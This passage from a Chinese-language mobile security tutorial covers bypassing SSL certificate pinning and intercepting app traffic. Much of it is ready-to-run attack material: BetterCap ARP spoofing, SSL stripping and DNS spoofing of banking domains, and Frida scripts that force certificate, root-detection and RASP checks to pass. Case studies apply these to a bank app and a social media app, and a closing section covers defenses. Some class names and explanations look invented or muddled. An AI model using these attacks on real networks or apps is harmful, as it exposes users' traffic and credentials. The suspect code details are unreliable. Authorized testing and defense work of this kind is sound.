            logging.info(f"[+] SNI detected: {data.client_hello.sni}")
    
    def request(self, flow: http.HTTPFlow):
        """记录所有 HTTP 请求"""
        logging.info(f"[+] Request: {flow.request.method} {flow.request.pretty_url}")
        
        # 自动注入自定义 Header
        flow.request.headers["X-Intercepted-By"] = "x7peeps-research"
        
        # 记录请求体
        if flow.request.content:
            logging.info(f"[+] Body: {flow.request.content[:500]}")
    
    def response(self, flow: http.HTTPFlow):
        """处理服务器响应"""
        logging.info(f"[+] Response: {flow.response.status_code}")
        
        # 记录响应中的敏感信息
        if "password" in flow.response.text.lower():
            logging.warning(f"[!] Potential password leak in response!")

addons = [SSLUnpinInspector()]
```

#### 使用 mitmproxy 透明代理模式

```bash
# 启动 mitmproxy 透明代理
mitmproxy --mode transparent --listen-port 8080 -s mitmproxy_ssl_bypass.py

# 配置 iptables 将流量转发到 mitmproxy
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

### 11.3 BetterCap 高级用法

BetterCap 是一个用 Go 语言编写的现代 MITM 框架，集成了 ARP 欺骗、SSL 剥离、HSTS 绕过等功能：

```bash
# 启动 BetterCap 交互模式
sudo bettercap -iface eth0

# ===== BetterCap 交互命令 =====
# 网络探测
net.probe on
net.show

# ARP 欺骗
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal true
arp.spoof on

# HTTPS 代理 + SSL 剥离
set http.proxy.sslstrip true
http.proxy on

# HSTS 绕过
set https.proxy.sslstrip true
set https.proxy.certificate /path/to/burp-ca-cert.pem
https.proxy on

# DNS 欺骗
set dns.spoof.all true
set dns.spoof.domains banking.com,*.banking.com
dns.spoof on
```

BetterCap 的 SSL 剥离原理是通过在 HTTP 响应中将所有 `https://` 链接替换为 `http://` 链接，诱导客户端使用明文 HTTP 通信。对于使用了 HSTS 头部的站点，BetterCap 还支持 HSTS 绕过：通过将目标域名的子域名注册为未包含在 HSTS 预加载列表中的新域名，从而绕过浏览器的 HSTS 强制 HTTPS 策略。

#### Mobile ARP Spoof Attack 实战

```bash
# 完整的 Mobile MITM 攻击链
# 1. 启用 IP 转发
sudo sysctl -w net.ipv4.ip_forward=1

# 2. 配置 iptables 规则转发到代理
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# 3. 启动 BetterCap + SSL 剥离
sudo bettercap -eval "set arp.spoof.targets 192.168.1.105; set arp.spoof.internal true; set http.proxy.sslstrip true; arp.spoof on; http.proxy on"
```

---

## 0x0C 运行时插桩与高级验证机制绕过

### 12.1 Native 层 SSL Pinning 绕过

当应用将证书校验逻辑实现在 Native 层（通过 JNI 调用 C/C++ 代码）时，Java 层的 Hook 完全无效。这种场景通常出现在：
- 使用 OpenSSL 或 BoringSSL 的自定义构建
- 通过 NDK 实现的证书校验
- 金融类 App 的高强度保护

#### 定位 Native 函数

```bash
# 使用 Ghidra 或 Hopper 反编译 libnative-lib.so
# 搜索字符串特征："certificate"、"pinning"、"verify"、"checkServer"

# 使用 Frida 枚举 Native 导出函数
frida -U -f com.target.app -l enumerate_exports.js
```

```javascript
// enumerate_exports.js - 枚举 Native 库导出函数
var module = Process.findModuleByName("libnative-lib.so");
if (module) {
    console.log("Module: " + module.name);
    console.log("Base: " + module.base);
    console.log("Size: " + module.size);
    
    // 枚举导出函数
    var exports = Module.enumerateExportsSync("libnative-lib.so");
    exports.forEach(function(exp) {
        if (exp.name.toLowerCase().indexOf("verify") !== -1 ||
            exp.name.toLowerCase().indexOf("cert") !== -1 ||
            exp.name.toLowerCase().indexOf("pinning") !== -1) {
            console.log("[Potential target] " + exp.name + " at " + exp.address);
        }
    });
}
```

#### HOOK Native SSL 验证函数

```javascript
// native_ssl_bypass.js
// 针对 OpenSSL / BoringSSL 的 Native Hook

// Hook SSL_verify_cert_chain
var sslVerifyChain = Module.findExportByName(null, "SSL_verify_cert_chain");
if (sslVerifyChain) {
    Interceptor.attach(sslVerifyChain, {
        onLeave: function(retval) {
            console.log("[+] SSL_verify_cert_chain returned: " + retval);
            retval.replace(1); // 1 = X509_V_OK
        }
    });
}

// Hook X509_verify_cert_error_string（用于捕获错误原因）
var x509ErrorStr = Module.findExportByName(null, "X509_verify_cert_error_string");
if (x509ErrorStr) {
    Interceptor.attach(x509ErrorStr, {
        onEnter: function(args) {
            console.log("[+] X509 error code: " + args[0]);
        }
    });
}

// Hook SSL_get_verify_result
var sslGetVerifyResult = Module.findExportByName(null, "SSL_get_verify_result");
if (sslGetVerifyResult) {
    Interceptor.attach(sslGetVerifyResult, {
        onLeave: function(retval) {
            console.log("[+] SSL_get_verify_result -> patching");
            retval.replace(0); // X509_V_OK
        }
    });
}

// 通用策略：Hook SSL_CTX_set_verify 回调注册
var sslCtxSetVerify = Module.findExportByName(null, "SSL_CTX_set_verify");
if (sslCtxSetVerify) {
    Interceptor.attach(sslCtxSetVerify, {
        onEnter: function(args) {
            console.log("[+] SSL_CTX_set_verify called, mode: " + args[1]);
            // args[2] 是 verify_callback
            // 可以替换为始终返回 1 的回调
        }
    });
}
```

### 12.2 绕过 Certificate Transparency 检查

自 Android 14 起，Google 要求某些应用必须通过 Certificate Transparency（CT）检查。CT 检查会验证服务器证书是否已被提交到公共 CT 日志中。即使是有效的证书，如果未在 CT 日志中出现，连接也会被拒绝。

```javascript
// bypass_certificate_transparency.js
Java.perform(function() {
    // Hook Conscrypt 的 CT 检查
    try {
        var CTVerifier = Java.use('com.android.org.conscrypt.CertificateTranscriptVerifier');
        CTVerifier.verify.implementation = function(certificates, hostname) {
            console.log("[+] CT verification bypassed for: " + hostname);
            return true; // 始终通过 CT 验证
        };
    } catch(e) { console.log("[-] CTVerifier not found"); }

    // Hook TrustManagerImpl 中的 CT 检查
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(
            chain, anchors, host, clientAuth, ocspData, ctData) {
            console.log("[+] TrustManagerImpl.verifyChain bypassed for: " + host);
            return chain;
        };
    } catch(e) {}
});
```

### 12.3 绕过 CRL / OCSP 检查

证书吊销列表（CRL）和在线证书状态协议（OCSP）检查也会阻止代理证书：

```javascript
// bypass_ocsp.js
Java.perform(function() {
    // Hook OCSP 检查
    try {
        var OCSPChecker = Java.use('com.android.org.conscrypt.OcspUtils');
        if (OCSPChecker) {
            OCSPChecker.check.implementation = function(cert, issuer) {
                console.log("[+] OCSP check bypassed");
                return true;
            };
        }
    } catch(e) {}

    // Hook CertificateFactory 以绕过 CRL 检查
    try {
        var CertPathValidator = Java.use('java.security.cert.CertPathValidator');
        CertPathValidator.validate.implementation = function(certPath, params) {
            console.log("[+] CertPathValidator bypassed");
            return null;
        };
    } catch(e) {}
});
```

### 12.4 APK-MITM：自动补丁工具

APK-MITM 是一个自动化工具，它通过静态分析识别 APK 中的 SSL pinning 实现，并将其 Patch 掉：

```bash
# 安装 APK-MITM (npm)
npm install -g apk-mitm

# 使用
apk-mitm target.apk

# 输出 patched APK: patched-target.apk
adb install patched-target.apk
```

APK-MITM 的工作原理：
1. 解压 APK
2. 搜索 Network Security Config XML
3. 搜索 OkHttp CertificatePinner 代码模式
4. 搜索自定义 TrustManager 实现
5. Patch 所有发现的目标
6. 重新打包并签名

---

## 0x0D 真实案例研究

### 13.1 案例一：某银行 App 的 Multi-Layer Pinning 绕过

**背景**：在一次授权的移动安全评估中，目标为某大型商业银行的 Android 版手机银行 App。

**初步分析**：
- 使用 jadx 反编译后，发现应用使用了 OkHttp 作为 HTTP 客户端
- 存在 OkHttp 的 CertificatePinner 配置
- 应用同时部署了 Network Security Config（network_security_config.xml）
- 具有 root 检测机制，检测到 root 后立即退出

**绕过步骤**：

```bash
# 第一步：绕过 Root 检测（使用 Frida）
frida -U -f com.banking.app --no-pause -l bypass_root_detection.js

# bypass_root_detection.js 核心逻辑
# Hook: System.getProperty() -> 返回空
# Hook: Runtime.exec() -> 拦截命令执行
# Hook: File.exists() -> 对越狱/root 文件路径返回 false
```

```javascript
// bypass_root_detection.js
Java.perform(function() {
    // Hook Root 检测
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = [
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        ];
        if (rootPaths.indexOf(path) !== -1) {
            console.log("[+] Blocked root path check: " + path);
            return false;
        }
        return this.exists();
    };
});
```

**第二阶段：SSL Pinning Bypass**

```
Root 检测绕过后，应用正常启动，但所有网络请求都失败。
Burp Suite 中没有任何流量。

使用 Objection 发现：
- OkHttp 层被 Hook 成功
- 但流量仍然无法捕获

进一步分析发现：应用使用了双重 pinning
1. OkHttp CertificatePinner（已绕过）
2. 自定义 TrustManager（Native 层进行额外的证书哈希校验）
```

**最终解决方案**：

```javascript
// 针对 Native 层的额外证书校验
var module = Process.findModuleByName("libsecurity.so");
var nativeVerify = module.base.add(0x1234A); // 通过逆向找到的偏移

Interceptor.attach(nativeVerify, {
    onEnter: function(args) {
        console.log("[+] Native certificate verification triggered");
    },
    onLeave: function(retval) {
        console.log("[+] Native verify result: " + retval);
        retval.replace(1); // 强制返回验证通过
    }
});
```

**结果**：成功捕获到银行的全部 API 请求流量，发现了多个业务逻辑漏洞和敏感信息泄露问题。

### 13.2 案例二：某社交媒体 App iOS 端流量截获

**背景**：某主流社交媒体 iOS 应用，使用 TrustKit 进行证书固定。

**挑战**：
- 应用部署了越狱检测（检测到越狱后拒绝启动）
- TrustKit 使用了 SPKI pinning
- 部分 API 端点使用了 certificate transparency

**绕过方案**：

```bash
# 使用修改版 SSL Kill Switch 2 + Frida 组合
# 1. 首先安装 SSL Kill Switch 2 (Cydia)
# 2. 使用 Frida Hook 越狱检测

# Frida 脚本：同时绕过越狱检测和 TrustKit
objection --gadget com.socialmedia.app explore \
    --startup-command "ios jailbreak disable" \
    --startup-command "ios sslpinning disable"

# 额外 Hook SecTrustEvaluateWithError
frida -U -l ios_advanced_bypass.js -n "SocialMedia"
```

```javascript
// ios_advanced_bypass.js - 社交媒体 App 专属 bypass
if (ObjC.available) {
    // Hook NSBundle 以绕过越狱检测
    var NSBundle = ObjC.classes.NSBundle;
    var oldImp = NSBundle['- bundleIdentifier'];
    if (oldImp) {
        oldImp.implementation = function(self, sel) {
            return oldImp(self, sel);
        };
    }

    // Hook TrustKit (即使 SSL Kill Switch 已生效)
    var TSKValidator = ObjC.classes.TSKPinningValidator;
    if (TSKValidator) {
        ObjC.schedule(ObjC.mainQueue, function() {
            var method = TSKValidator['- evaluateTrust:forHostname:'];
            if (method) {
                method.implementation = function(self, sel, trust, hostname) {
                    console.log("[+] TrustKit bypassed for: " + hostname);
                    return true;
                };
            }
        });
    }

    // Hook CT (Certificate Transparency) 检查
    var CTEvaluator = Module.findExportByName(
        "Security", "SecTrustEvaluateWithError"
    );
    if (CTEvaluator) {
        Interceptor.attach(CTEvaluator, {
            onLeave: function(retval) {
                retval.replace(ptr(1)); // 始终成功
            }
        });
    }
}
```

**结果**：成功拦截了社交媒体 App 的所有 API 流量，包括用户帖子流、消息接口和广告请求。

---

## 0x0E 检测与防御：如何阻止 SSL Pinning Bypass

### 14.1 RASP（Runtime Application Self-Protection）

RASP 技术是目前最有效的 SSL Pinning bypass 防御手段之一。它将安全检测逻辑嵌入到应用运行时环境中，实时检测并阻止 Hook 行为。

#### 主流 RASP 解决方案

| 产品 | 平台 | 特点 |
|------|------|------|
| Guardsquare DexGuard / iXGuard | Android / iOS | 混淆 + RASP，支持 Frida 检测 |
| Appdome | Android / iOS | 无代码注入，一键加固 |
| Talsec freeRASP | Android / iOS | 开源免费，Frida-server 检测 |
| Approov | Android / iOS | 动态认证 + RASP |
| Promon Shield | Android / iOS | 反 Hook + 反调试 + 反篡改 |

#### Frida 检测典型实现

```java
// Android RASP 中的 Frida 检测示例
public class FridaDetector {
    
    // 检测 Frida Server 端口
    public static boolean checkFridaPort() {
        try {
            Process process = Runtime.getRuntime().exec(
                "netstat -an | grep 27042"
            );
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("LISTEN")) {
                    return true;
                }
            }
        } catch (IOException e) {}
        return false;
    }
    
    // 检测 Frida 线程名
    public static boolean checkFridaThreads() {
        try {
            String[] suspiciousThreads = {
                "gmain", "gdbus", "gum-js-loop", "pool-frida"
            };
            Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
            for (Thread thread : threadSet) {
                for (String name : suspiciousThreads) {
                    if (thread.getName().contains(name)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {}
        return false;
    }
    
    // 检测 Frida 库加载
    public static boolean checkFridaLibrary() {
        try {
            BufferedReader reader = new BufferedReader(
                new FileReader("/proc/self/maps")
            );
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("frida-agent") ||
                    line.contains("libfrida")) {
                    return true;
                }
            }
        } catch (IOException e) {}
        return false;
    }
    
    // 检测 D-Bus（Frida 通信机制）
    public static boolean checkDbus() {
        try {
            File dbusFile = new File("/tmp/frida.socket");
            return dbusFile.exists();
        } catch (Exception e) {}
        return false;
    }
}
```

#### Native 层的 Frida 检测

高级 RASP 方案将检测逻辑放在 Native 层，通过系统调用直接检查内存状态，从而避开 Frida 的 Hook：

```cpp
// Native 层 Frida 检测（C++）
#include <jni.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <link.h>
#include <fcntl.h>

// 方法 1：检查 /proc/self/maps 中的可疑映射
bool checkSuspiciousMaps() {
    FILE* fp = fopen("/proc/self/maps", "r");
    if (!fp) return false;
    
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "frida") || 
            strstr(line, "gadget") ||
            strstr(line, "gum")) {
            fclose(fp);
            return true;
        }
        
        // 检查可写可执行内存段（W^X violation）
        char perms[5];
        sscanf(line, "%*x-%*x %4s", perms);
        if (strcmp(perms, "rwxp") == 0) {
            fclose(fp);
            return true;
        }
    }
    fclose(fp);
    return false;
}

// 方法 2：直接系统调用绕过 LD_PRELOAD
extern "C" JNIEXPORT jboolean JNICALL
Java_com_app_security_NativeDetector_checkSyscall(
    JNIEnv* env, jclass clazz) {
    
    char buf[4096];
    int fd = syscall(SYS_open, "/proc/self/maps", O_RDONLY);
    if (fd < 0) return false;
    
    ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
    syscall(SYS_close, fd);
    
    buf[n > 0 ? n : 0] = '\0';
    
    return (strstr(buf, "frida") != NULL || 
            strstr(buf, "gum") != NULL);
}

// 方法 3：代码完整性校验
bool checkCodeIntegrity(void* funcPtr, const uint8_t* expectedBytes, size_t len) {
    uint8_t actualBytes[len];
    memcpy(actualBytes, funcPtr, len);
    return memcmp(actualBytes, expectedBytes, len) == 0;
}
```

### 14.2 证书锁定（Certificate Locking）

证书锁定比 SSL Pinning 更进一步：应用不仅对比证书，还会拒绝任何非预期的根 CA 签名。这意味着即使攻击者将代理 CA 注入到系统的信任存储中，也无法通过验证。

### 14.3 证书透明度监控

通过监控公共 CT 日志，开发者可以发现是否有未经授权的证书被签发用于自己的域名。如果 CT 日志中出现意外的证书条目，说明可能有人正在尝试进行 MITM 攻击。

### 14.4 服务端校验

即使客户端的 pinning 被绕过，服务端仍然可以检测异常行为：
- 检查请求是否来自代理（通过 X-Forwarded-For 头的异常模式）
- 检查 TLS 指纹（JA3 指纹）
- 检查请求时间间隔是否异常（机器自动化特征）

### 14.5 绕过 RASP 的进阶方法

尽管 RASP 提供了强力保护，但专业的渗透测试人员仍然可以通过以下方法绕过：

**方法一：内存 Patch RASP 库**

```javascript
// 使用 Frida 在 RASP 初始化前 Patch 其检测函数
Interceptor.attach(Module.findExportByName("librasp.so", "detectFrida"), {
    onLeave: function(retval) {
        retval.replace(0); // 假装没有检测到 Frida
    }
});
```

**方法二：使用定制版 Frida**

一些高级 RASP 解决方案会检测 Frida 的特征（如端口 27042、D-Bus 通信模式、线程名等）。定制版 Frida 可以修改这些特征：

```bash
# 修改 Frida 源码后重新编译
# 修改端口：src/frida-core/src/frida-connection.c
# 修改线程名：src/frida-gum/gum/guminit.c
# 移除 D-Bus 检测特征
```

**方法三：APK-MITM 静态补丁（绕过 RASP 的最有效方法）**

由于 RASP 在运行时生效，如果在应用启动前就静态地去除了 pinning 逻辑，RASP 将无能为力。APK-MITM 这类工具直接修改了编译后的代码，使得 pinning 逻辑在运行时根本就不存在。

---

## 0x0F 总结与建议

### 15.1 攻击者视角：SSL Pinning Bypass 的路线图

```
[1] 能否安装自定义 CA 证书到系统？
    ├── 可以 → 尝试标准代理（Burp、mitmproxy）
    ├── 不可以 → 查看应用是否信任 user CA store
    │   └── 否 → 修改 AndroidManifest targetSdkVersion
    
    [2] 代理连接是否成功？
    ├── 成功 → 完成
    └── 失败 → 进入 SSL Pinning Bypass 流程
    
    [3] 选择 bypass 方法：
    ├── Objection (android sslpinning disable / ios sslpinning disable)
    ├── Frida 通用脚本 (codeshare)
    ├── Xposed/LSPosed 模块 (JustTrustMe, TrustMeAlready)
    ├── SSL Kill Switch 2 (iOS)
    ├── APK-MITM / reFlutter (静态补丁)
    └── Native 层 Hook (针对自定义 OpenSSL/BoringSSL)
    
    [4] 如果仍有 RASP 检测：
    ├── 先绕过 root/jailbreak 检测
    ├── 使用定制版 Frida
    ├── 静态补丁去除 RASP
    └── Hook RASP 的检测函数
```

### 15.2 防御者视角：建设多层纵深防御

1. **第一层：基础防御**
   - 使用 Network Security Config（Android）或 ATS（iOS）
   - 实现 Certificate Pinning
   - 使用 TrustKit 等成熟库

2. **第二层：高级防御**
   - 将 pinning 逻辑移入 Native 层
   - 部署 RASP 解决方案（如 Talsec、DexGuard）
   - 实现完整性校验和反 Hook 检测
   - 服务端 JA3 指纹验证

3. **第三层：纵深防御**
   - 证书透明度（CT）监控
   - 服务端异常行为检测（频率、指纹）
   - 定期轮换证书和密钥
   - 建立应急响应流程

4. **正确的心态**
   - **SSL Pinning 从来不是万能的**。就像锁只能防君子不能防小偷一样，SSL Pinning 只能阻止低级别的攻击者，而无法阻止有决心、有资源的专业攻击者。
   - **防御的目标不是让攻破变不可能，而是让攻破的成本远高于攻击的收益**。
   - **不要仅依赖客户端安全**。真正的安全来自服务端验证、加密、监控和响应的组合。

### 15.3 关键要点

- SSL Pinning 绕过是移动安全测试的必备技能，但应仅在授权的安全评估中使用
- 没有一种 bypass 方法适用于所有应用，需要结合多种技术
- 理解底层原理（TLS 握手、TrustManager、OkHttp 架构）比记忆脚本更重要
- RASP 和 Native 层防御正在变得越来越普遍，安全研究人员需要持续更新技术
- 防御方应当采用纵深防御策略，而不是依赖单一的安全机制

---

## 参考文献

1. OWASP Mobile Security Testing Guide - https://mas.owasp.org/MASTG/
2. Frida Official Documentation - https://frida.re/docs/home/
3. Objection GitHub Repository - https://github.com/sensepost/objection
4. Android Network Security Configuration - https://developer.android.com/privacy-and-security/security-config
5. TrustKit iOS SSL Pinning - https://github.com/datatheorem/TrustKit
6. SSL Kill Switch 2 - https://github.com/nabla-c0d3/ssl-kill-switch2
7. JustTrustMe Xposed Module - https://github.com/Fuzion24/JustTrustMe
8. NVISO Flutter TLS Verification Bypass - https://github.com/NVISOsecurity/disable-flutter-tls-verification
9. reFlutter - https://github.com/Impact-I/reFlutter
10. APK-MITM - https://github.com/shroudedcode/apk-mitm
11. BetterCap - https://github.com/bettercap/bettercap
12. HTTP Toolkit Frida Interception Scripts - https://github.com/httptoolkit/frida-interception-and-unpinning
13. Approov Frida Detection - https://approov.io/knowledge/frida-detection-prevention
14. Talsec freeRASP - https://github.com/talsec/Free-RASP-Community
